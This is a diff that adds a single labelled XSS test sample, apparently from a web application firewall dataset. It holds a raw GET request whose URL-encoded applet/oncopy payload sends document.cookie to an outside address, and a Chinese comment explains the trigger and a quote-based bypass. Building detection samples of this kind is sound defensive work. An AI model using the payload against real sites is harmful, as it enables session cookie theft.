@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_applet标签_oncopy事件-06506623
+# 攻击载荷利用了HTML中的applet标签和oncopy属性，触发location.href向恶意地址发送cookie信息。需要复制一段文字触发，使用双引号绕过
+GET /?id=%3Capplet%20oncopy=%28location.href=%22http:%2F%2F192.168.110.92:8080%2Findex.jsp%3Fid=%22+document.cookie%29%20value=%22XSS%22%20autofocus%20tabindex=1%3Etest&bid=hd_tag_m8mv25u2 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25u2
+RM-PRO-Token: abf55fe6818813f37d3519f4d2d29e4c
+RM-PRO-Time: 1742808506897
+User-Agent: curl/7.83.1
+
